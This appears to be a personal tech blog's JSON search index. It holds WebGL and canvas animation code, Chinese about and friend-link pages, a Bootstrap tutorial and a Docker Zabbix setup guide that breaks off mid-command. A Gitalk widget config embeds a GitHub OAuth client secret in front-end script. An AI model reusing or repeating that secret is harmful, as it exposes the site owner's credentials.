var PI2 = Math.PI * 2.0; var limit = [pointFlower.area.x, pointFlower.area.y, pointFlower.area.z]; var repeatPos = function (prt, cmp, limit) { if(Math.abs(prt.position[cmp]) - prt.size * 0.5 > limit) { //out of area if(prt.position[cmp] > 0) { prt.position[cmp] -= limit * 2.0; } else { prt.position[cmp] += limit * 2.0; } } }; var repeatEuler = function (prt, cmp) { prt.euler[cmp] = prt.euler[cmp] % PI2; if(prt.euler[cmp] < 0.0) { prt.euler[cmp] += PI2; } }; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; prtcl.update(timeInfo.delta, timeInfo.elapsed); repeatPos(prtcl, 0, pointFlower.area.x); repeatPos(prtcl, 1, pointFlower.area.y); repeatPos(prtcl, 2, pointFlower.area.z); repeatEuler(prtcl, 0); repeatEuler(prtcl, 1); repeatEuler(prtcl, 2); prtcl.alpha = 1.0;//(pointFlower.area.z - prtcl.position[2]) * 0.5; prtcl.zkey = (camera.matrix[2] * prtcl.position[0] + camera.matrix[6] * prtcl.position[1] + camera.matrix[10] * prtcl.position[2] + camera.matrix[14]); } // sort pointFlower.particles.sort(function(p0, p1){return p0.zkey - p1.zkey;}); // update data var ipos = pointFlower.positionArrayOffset; var ieuler = pointFlower.eulerArrayOffset; var imisc = pointFlower.miscArrayOffset; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; pointFlower.dataArray[ipos] = prtcl.position[0]; pointFlower.dataArray[ipos + 1] = prtcl.position[1]; pointFlower.dataArray[ipos + 2] = prtcl.position[2]; ipos += 3; pointFlower.dataArray[ieuler] = prtcl.euler[0]; pointFlower.dataArray[ieuler + 1] = prtcl.euler[1]; pointFlower.dataArray[ieuler + 2] = prtcl.euler[2]; ieuler += 3; pointFlower.dataArray[imisc] = prtcl.size; pointFlower.dataArray[imisc + 1] = prtcl.alpha; imisc += 2; } //draw gl.enable(gl.BLEND); //gl.disable(gl.DEPTH_TEST); gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA); var prog = pointFlower.program; useShader(prog); gl.uniformMatrix4fv(prog.uniforms.uProjection, false, projection.matrix); gl.uniformMatrix4fv(prog.uniforms.uModelview, false, camera.matrix); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); gl.uniform3fv(prog.uniforms.uDOF, Vector3.arrayForm(camera.dof)); gl.uniform3fv(prog.uniforms.uFade, Vector3.arrayForm(pointFlower.fader)); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.vertexAttribPointer(prog.attributes.aPosition, 3, gl.FLOAT, false, 0, pointFlower.positionArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aEuler, 3, gl.FLOAT, false, 0, pointFlower.eulerArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aMisc, 2, gl.FLOAT, false, 0, pointFlower.miscArrayOffset * Float32Array.BYTES_PER_ELEMENT); // doubler for(var i = 1; i < 2; i++) { var zpos = i * -2.0; pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); } //main pointFlower.offset[0] = 0.0; pointFlower.offset[1] = 0.0; pointFlower.offset[2] = 0.0; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(prog); gl.enable(gl.DEPTH_TEST); gl.disable(gl.BLEND); } // effects //common util function createEffectProgram(vtxsrc, frgsrc, exunifs, exattrs) { var ret = {}; var unifs = ['uResolution', 'uSrc', 'uDelta']; if(exunifs) { unifs = unifs.concat(exunifs); } var attrs = ['aPosition']; if(exattrs) { attrs = attrs.concat(exattrs); } ret.program = createShader(vtxsrc, frgsrc, unifs, attrs); useShader(ret.program); ret.dataArray = new Float32Array([ -1.0, -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, 1.0 ]); ret.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, ret.buffer); gl.bufferData(gl.ARRAY_BUFFER, ret.dataArray, gl.STATIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(ret.program); return ret; } // basic usage // useEffect(prog, srctex({'texture':texid, 'dtxArray':(f32)[dtx, dty]})); //basic initialize // gl.uniform**(...); //additional uniforms // drawEffect() // unuseEffect(prog) // TEXTURE0 makes src function useEffect(fxobj, srctex) { var prog = fxobj.program; useShader(prog); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); if(srctex != null) { gl.uniform2fv(prog.uniforms.uDelta, srctex.dtxArray); gl.uniform1i(prog.uniforms.uSrc, 0); gl.activeTexture(gl.TEXTURE0); gl.bindTexture(gl.TEXTURE_2D, srctex.texture); } } function drawEffect(fxobj) { gl.bindBuffer(gl.ARRAY_BUFFER, fxobj.buffer); gl.vertexAttribPointer(fxobj.program.attributes.aPosition, 2, gl.FLOAT, false, 0, 0); gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4); } function unuseEffect(fxobj) { unuseShader(fxobj.program); } var effectLib = {}; function createEffectLib() { var vtxsrc, frgsrc; //common var cmnvtxsrc = document.getElementById(\"fx_common_vsh\").textContent; //background frgsrc = document.getElementById(\"bg_fsh\").textContent; effectLib.sceneBg = createEffectProgram(cmnvtxsrc, frgsrc, ['uTimes'], null); // make brightpixels buffer frgsrc = document.getElementById(\"fx_brightbuf_fsh\").textContent; effectLib.mkBrightBuf = createEffectProgram(cmnvtxsrc, frgsrc, null, null); // direction blur frgsrc = document.getElementById(\"fx_dirblur_r4_fsh\").textContent; effectLib.dirBlur = createEffectProgram(cmnvtxsrc, frgsrc, ['uBlurDir'], null); //final composite vtxsrc = document.getElementById(\"pp_final_vsh\").textContent; frgsrc = document.getElementById(\"pp_final_fsh\").textContent; effectLib.finalComp = createEffectProgram(vtxsrc, frgsrc, ['uBloom'], null); } // background function createBackground() { //console.log(\"create background\"); } function initBackground() { //console.log(\"init background\"); } function renderBackground() { gl.disable(gl.DEPTH_TEST); useEffect(effectLib.sceneBg, null); gl.uniform2f(effectLib.sceneBg.program.uniforms.uTimes, timeInfo.elapsed, timeInfo.delta); drawEffect(effectLib.sceneBg); unuseEffect(effectLib.sceneBg); gl.enable(gl.DEPTH_TEST); } // post process var postProcess = {}; function createPostProcess() { //console.log(\"create post process\"); } function initPostProcess() { //console.log(\"init post process\"); } function renderPostProcess() { gl.enable(gl.TEXTURE_2D); gl.disable(gl.DEPTH_TEST); var bindRT = function (rt, isclear) { gl.bindFramebuffer(gl.FRAMEBUFFER, rt.frameBuffer); gl.viewport(0, 0, rt.width, rt.height); if(isclear) { gl.clearColor(0, 0, 0, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); } }; //make bright buff bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.mkBrightBuf, renderSpec.mainRT); drawEffect(effectLib.mkBrightBuf); unuseEffect(effectLib.mkBrightBuf); // make bloom for(var i = 0; i < 2; i++) { var p = 1.5 + 1 * i; var s = 2.0 + 1 * i; bindRT(renderSpec.wHalfRT1, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT0); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, p, 0.0, s, 0.0); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT1); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, 0.0, p, 0.0, s); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); } //display gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.viewport(0, 0, renderSpec.width, renderSpec.height); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); useEffect(effectLib.finalComp, renderSpec.mainRT); gl.uniform1i(effectLib.finalComp.program.uniforms.uBloom, 1); gl.activeTexture(gl.TEXTURE1); gl.bindTexture(gl.TEXTURE_2D, renderSpec.wHalfRT0.texture); drawEffect(effectLib.finalComp); unuseEffect(effectLib.finalComp); gl.enable(gl.DEPTH_TEST); } ///// var SceneEnv = {}; function createScene() { createEffectLib(); createBackground(); createPointFlowers(); createPostProcess(); sceneStandBy = true; } function initScene() { initBackground(); initPointFlowers(); initPostProcess(); //camera.position.z = 17.320508; camera.position.z = pointFlower.area.z + projection.nearfar[0]; projection.angle = Math.atan2(pointFlower.area.y, camera.position.z + pointFlower.area.z) * 180.0 / Math.PI * 2.0; Matrix44.loadProjection(projection.matrix, renderSpec.aspect, projection.angle, projection.nearfar[0], projection.nearfar[1]); } function renderScene() { //draw Matrix44.loadLookAt(camera.matrix, camera.position, camera.lookat, camera.up); gl.enable(gl.DEPTH_TEST); //gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, renderSpec.mainRT.frameBuffer); gl.viewport(0, 0, renderSpec.mainRT.width, renderSpec.mainRT.height); gl.clearColor(0.005, 0, 0.05, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); renderBackground(); renderPointFlowers(); renderPostProcess(); } ///// function onResize(e) { makeCanvasFullScreen(document.getElementById(\"sakura\")); setViewports(); if(sceneStandBy) { initScene(); } } function setViewports() { renderSpec.setSize(gl.canvas.width, gl.canvas.height); gl.clearColor(0.2, 0.2, 0.5, 1.0); gl.viewport(0, 0, renderSpec.width, renderSpec.height); var rtfunc = function (rtname, rtw, rth) { var rt = renderSpec[rtname]; if(rt) deleteRenderTarget(rt); renderSpec[rtname] = createRenderTarget(rtw, rth); }; rtfunc('mainRT', renderSpec.width, renderSpec.height); rtfunc('wFullRT0', renderSpec.width, renderSpec.height); rtfunc('wFullRT1', renderSpec.width, renderSpec.height); rtfunc('wHalfRT0', renderSpec.halfWidth, renderSpec.halfHeight); rtfunc('wHalfRT1', renderSpec.halfWidth, renderSpec.halfHeight); } function render() { renderScene(); } var animating = true; function toggleAnimation(elm) { animating ^= true; if(animating) animate(); if(elm) { elm.innerHTML = animating? \"Stop\":\"Start\"; } } function stepAnimation() { if(!animating) animate(); } function animate() { var curdate = new Date(); timeInfo.elapsed = (curdate - timeInfo.start) / 1000.0; timeInfo.delta = (curdate - timeInfo.prev) / 1000.0; timeInfo.prev = curdate; if(animating) requestAnimationFrame(animate); render(); } function makeCanvasFullScreen(canvas) { var b = document.body; var d = document.documentElement; fullw = Math.max(b.clientWidth , b.scrollWidth, d.scrollWidth, d.clientWidth); fullh = Math.max(b.clientHeight , b.scrollHeight, d.scrollHeight, d.clientHeight); canvas.width = fullw; canvas.height = fullh; } window.addEventListener('load', function(e) { var canvas = document.getElementById(\"sakura\"); try { makeCanvasFullScreen(canvas); gl = canvas.getContext('experimental-webgl'); } catch(e) { alert(\"WebGL not supported.\" + e); console.error(e); return; } window.addEventListener('resize', onResize); setViewports(); createScene(); initScene(); timeInfo.start = new Date(); timeInfo.prev = timeInfo.start; animate(); }); //set window.requestAnimationFrame (function (w, r) { w['r'+r] = w['r'+r] || w['webkitR'+r] || w['mozR'+r] || w['msR'+r] || w['oR'+r] || function(c){ w.setTimeout(c, 1000 / 60); }; })(window, 'equestAnimationFrame');","link":"/6.html"},{"title":"","text":"个人简介 分享很喜欢的**老罗**的一段话： “每一个生命来到世间都注定改变世界，别无选择。要么变得好一点，要么变得坏一点。你如果走进社会为了生存为了什么不要脸的理由，变成了一个恶心的成年人社会中的一员，那你就把这个世界变得恶心了一点点。如果你一生刚正不阿，如果你一生耿直，没有做任何恶心的事情，没做对别人有害的事情，一辈子拼了老命勉强把自己身边的几个人照顾好了，没有成名没有发财，没有成就伟大的事业，然后耿着脖子一生正直，到了七八十岁耿着脖子去世了。你这一生是不是没有改变世界？你还是改变世界了，你把这个世界变得美好了一点点。因为世界上又多了一个好人。“ 善恶终有报,天道好轮回。不信抬头看,苍天饶过谁。无论何时何地，我们都要保持一颗积极乐观、善良感恩的心。但行好事莫问前程，永远年轻，永远热内盈眶，永远保持正能量。💪💪💪💪💪💪冲鸭！！！！ -&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;个人信息：计算机科学与技术专业从事运维网站维护码畜一枚坚信代码改变世界 博客信息 网站采用的Icarus主题 追求尽可能的简洁，清晰，易用。 在Icarus主题之上进行了部分修改。 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page网站cdn优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中gitalk最新评论的获取 博客图片上传picgo工具github图传使用 安装、部分配置icarus主题中文版 技术知识点 Java并发知识点 其他 网易云音乐歌单分享 计划2022计划 坚持学习，坚持分享，坚持把工作中运用到的知识分享出来。 2021计划2020计划 2019计划 2018.12.31/21:59:00-&gt;更新于2019.12.31 2019-GOALS额外： 追了很多剧 总结： 有优点有缺点，没坚持下来的还是太多，追了太多剧。以后多学习，多思考！ 时间轴记录","link":"/about/index.html"},{"title":"","text":"唐艺昕 李沁 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://zhi666.github.io/img/avatar.jpg 网站名称: 逸尘秀 网站地址：https://zhi666.github.io 网站简介：运维开发，技术分享 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"--- 温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '1b861f81e9a79ee6028d', clientSecret: 'cc629aff090aa9c60d5e13ddf7fcfce14f00a478', id: '666666', repo: 'issue_database', owner: 'zhi666', admin: \"zhi666\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"","text":"粒子跟随 body { background-color: #000000; padding: 0; margin: 0; overflow: hidden; } // One of my first experiments, woop! :D var SCREEN_WIDTH = window.innerWidth; var SCREEN_HEIGHT = window.innerHeight; var RADIUS = 70; var RADIUS_SCALE = 1; var RADIUS_SCALE_MIN = 1; var RADIUS_SCALE_MAX = 1.5; var QUANTITY = 25; var canvas; var context; var particles; var mouseX = SCREEN_WIDTH * 0.5; var mouseY = SCREEN_HEIGHT * 0.5; var mouseIsDown = false; function init() { canvas = document.getElementById( 'world' ); if (canvas && canvas.getContext) { context = canvas.getContext('2d'); // Register event listeners window.addEventListener('mousemove', documentMouseMoveHandler, false); window.addEventListener('mousedown', documentMouseDownHandler, false); window.addEventListener('mouseup', documentMouseUpHandler, false); document.addEventListener('touchstart', documentTouchStartHandler, false); document.addEventListener('touchmove', documentTouchMoveHandler, false); window.addEventListener('resize', windowResizeHandler, false); createParticles(); windowResizeHandler(); setInterval( loop, 1000 / 60 ); } } function createParticles() { particles = []; for (var i = 0; i < QUANTITY; i++) { var particle = { size: 1, position: { x: mouseX, y: mouseY }, offset: { x: 0, y: 0 }, shift: { x: mouseX, y: mouseY }, speed: 0.01+Math.random()*0.04, targetSize: 1, fillColor: '#' + (Math.random() * 0x904040 + 0xaaaaaa | 0).toString(16), orbit: RADIUS*.5 + (RADIUS * .5 * Math.random()) }; particles.push( particle ); } } function documentMouseMoveHandler(event) { mouseX = event.clientX - (window.innerWidth - SCREEN_WIDTH) * .5; mouseY = event.clientY - (window.innerHeight - SCREEN_HEIGHT) * .5; } function documentMouseDownHandler(event) { mouseIsDown = true; } function documentMouseUpHandler(event) { mouseIsDown = false; } function documentTouchStartHandler(event) { if(event.touches.length == 1) { event.preventDefault(); mouseX = event.touches[0].pageX - (window.innerWidth - SCREEN_WIDTH) * .5;; mouseY = event.touches[0].pageY - (window.innerHeight - SCREEN_HEIGHT) * .5; } } function documentTouchMoveHandler(event) { if(event.touches.length == 1) { event.preventDefault(); mouseX = event.touches[0].pageX - (window.innerWidth - SCREEN_WIDTH) * .5;; mouseY = event.touches[0].pageY - (window.innerHeight - SCREEN_HEIGHT) * .5; } } function windowResizeHandler() { SCREEN_WIDTH = window.innerWidth; SCREEN_HEIGHT = window.innerHeight; canvas.width = SCREEN_WIDTH; canvas.height = SCREEN_HEIGHT; } function loop() { if( mouseIsDown ) { RADIUS_SCALE += ( RADIUS_SCALE_MAX - RADIUS_SCALE ) * (0.02); } else { RADIUS_SCALE -= ( RADIUS_SCALE - RADIUS_SCALE_MIN ) * (0.02); } RADIUS_SCALE = Math.min( RADIUS_SCALE, RADIUS_SCALE_MAX ); context.fillStyle = 'rgba(0,0,0,0.05)'; context.fillRect(0, 0, context.canvas.width, context.canvas.height); for (i = 0, len = particles.length; i < len; i++) { var particle = particles[i]; var lp = { x: particle.position.x, y: particle.position.y }; // Rotation particle.offset.x += particle.speed; particle.offset.y += particle.speed; // Follow mouse with some lag particle.shift.x += ( mouseX - particle.shift.x) * (particle.speed); particle.shift.y += ( mouseY - particle.shift.y) * (particle.speed); // Apply position particle.position.x = particle.shift.x + Math.cos(i + particle.offset.x) * (particle.orbit*RADIUS_SCALE); particle.position.y = particle.shift.y + Math.sin(i + particle.offset.y) * (particle.orbit*RADIUS_SCALE); // Limit to screen bounds particle.position.x = Math.max( Math.min( particle.position.x, SCREEN_WIDTH ), 0 ); particle.position.y = Math.max( Math.min( particle.position.y, SCREEN_HEIGHT ), 0 ); particle.size += ( particle.targetSize - particle.size ) * 0.01; if( Math.round( particle.size ) == Math.round( particle.targetSize ) ) { particle.targetSize = 1 + Math.random() * 2; } context.beginPath(); context.fillStyle = particle.fillColor; context.strokeStyle = particle.fillColor; context.lineWidth = particle.size; context.moveTo(lp.x, lp.y); context.lineTo(particle.position.x, particle.position.y); context.stroke(); context.arc(particle.position.x, particle.position.y, particle.size/2, 0, Math.PI*2, true); context.fill(); } } window.onload = init;","link":"/remove.io/index.html"}],"posts":[{"title":"Bootstrap基础","text":"1,Bootstrap基础Bootstrap 包的内容 基本结构：Bootstrap 提供了一个带有网格系统、链接样式、背景的基本结构。这将在 Bootstrap 基本结构 部分详细讲解。 CSS：Bootstrap 自带以下特性：全局的 CSS 设置、定义基本的 HTML 元素样式、可扩展的 class，以及一个先进的网格系统。这将在 Bootstrap CSS 部分详细讲解。 组件：Bootstrap 包含了十几个可重用的组件，用于创建图像、下拉菜单、导航、警告框、弹出框等等。这将在 布局组件 部分详细讲解。 JavaScript 插件 ：Bootstrap 包含了十几个自定义的 jQuery 插件。您可以直接包含所有的插件，也可以逐个包含这些插件。这将在Bootstrap 插件部分详细讲解 定制：您可以定制 Bootstrap 的组件、LESS 变量和 jQuery 插件来得到您自己的版本。 1,引入Botstrap的css和js文件 12345678910111213141516171819202122232425实例&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Bootstrap 模板&lt;/title&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;!-- 引入 Bootstrap --&gt; &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;!-- HTML5 Shiv 和 Respond.js 用于让 IE8 支持 HTML5元素和媒体查询 --&gt; &lt;!-- 注意： 如果通过 file:// 引入 Respond.js 文件，则该文件无法起效果 --&gt; &lt;!--[if lt IE 9]&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, world!&lt;/h1&gt; &lt;!-- jQuery (Bootstrap 的 JavaScript 插件需要引入 jQuery) --&gt; &lt;script src=&quot;https://code.jquery.com/jquery.js&quot;&gt;&lt;/script&gt; &lt;!-- 包括所有已编译的插件 --&gt; &lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; jquery.js、bootstrap.min.js 和 bootstrap.min.css 文件，用于让一个常规的 HTML 文件变为使用了 Bootstrap 的模板。 12345678&lt;!-- 新 Bootstrap 核心 CSS 文件 --&gt;&lt;link href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;&lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 本地引入 12345678&lt;title&gt;Bootstrap基础&lt;/title&gt; &lt;!-- 引入Bootstrap核心文件 --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.min.css&quot;/&gt; &lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt; &lt;!-- 引入Bootstrap的JS文件 --&gt; &lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 导航栏模板 1234567891011121314151617181920212223242526272829303132333435&lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Navbar&lt;/a&gt; &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarSupportedContent&quot; aria-controls=&quot;navbarSupportedContent&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt; &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarSupportedContent&quot;&gt; &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt; &lt;li class=&quot;nav-item active&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;Link&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item dropdown&quot;&gt; &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; Dropdown &lt;/a&gt; &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;#&quot;&gt;Action&lt;/a&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;#&quot;&gt;Another action&lt;/a&gt; &lt;div class=&quot;dropdown-divider&quot;&gt;&lt;/div&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;#&quot;&gt;Something else here&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link disabled&quot; href=&quot;#&quot; tabindex=&quot;-1&quot; aria-disabled=&quot;true&quot;&gt;Disabled&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;form class=&quot;form-inline my-2 my-lg-0&quot;&gt; &lt;input class=&quot;form-control mr-sm-2&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt; &lt;button class=&quot;btn btn-outline-success my-2 my-sm-0&quot; type=&quot;submit&quot;&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/nav&gt; 按钮工具栏 12345678910111213141516&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot; aria-label=&quot;Toolbar with button groups&quot;&gt; &lt;div class=&quot;btn-group mr-2&quot; role=&quot;group&quot; aria-label=&quot;First group&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;1&lt;/button&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;2&lt;/button&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;3&lt;/button&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;4&lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;btn-group mr-2&quot; role=&quot;group&quot; aria-label=&quot;Second group&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;5&lt;/button&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;6&lt;/button&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;7&lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;btn-group&quot; role=&quot;group&quot; aria-label=&quot;Third group&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;8&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 按钮 12345678910&lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot;&gt;Primary&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-secondary&quot;&gt;Secondary&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-success&quot;&gt;Success&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-danger&quot;&gt;Danger&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-warning&quot;&gt;Warning&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-info&quot;&gt;Info&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-light&quot;&gt;Light&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-dark&quot;&gt;Dark&lt;/button&gt;&lt;button type=&quot;button&quot; class=&quot;btn btn-link&quot;&gt;Link&lt;/button&gt; 其他常用样式参考官网1https://getbootstrap.com/docs/4.5/components/buttons/","link":"/2020/08/04/Bootstrap%E5%9F%BA%E7%A1%80/"},{"title":"Docker部署zabbix+Grafana","text":"Docker部署Zabbix+Grafana一，zabbix和grafana环境搭建如在生产环境下运行请挂载volume 或者数据卷容器 环境 1234vm1 192.168.224.11 zabbix-server端 + grafanavm2 192.168.224.12 zabbix-agent端 + nginx 以下操作在vm1 docker部署 123456789101112131415 echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf sysctl -p --systemyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo yum install -y docker-ce docker-ce-cli containerd.io systemctl start docker &amp;&amp; systemctl enable docker一、安装bash-completeyum install -y bash-completion二、刷新文件source /usr/share/bash-completion/completions/docker &amp;&amp; source /usr/share/bash-completion/bash_completion 1.启动mysql容器 1234567891011docker run --name mysql -t \\ --restart=always \\ -p 3306:3306 \\ -v /etc/localtime:/etc/localtime \\ -e MYSQL_DATABASE=&quot;zabbix&quot; \\ -e MYSQL_USER=&quot;zabbix&quot; \\ -e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \\ -e MYSQL_ROOT_PASSWORD=&quot;root_Password@&quot; \\ -v /data/mysql/data:/var/lib/mysql 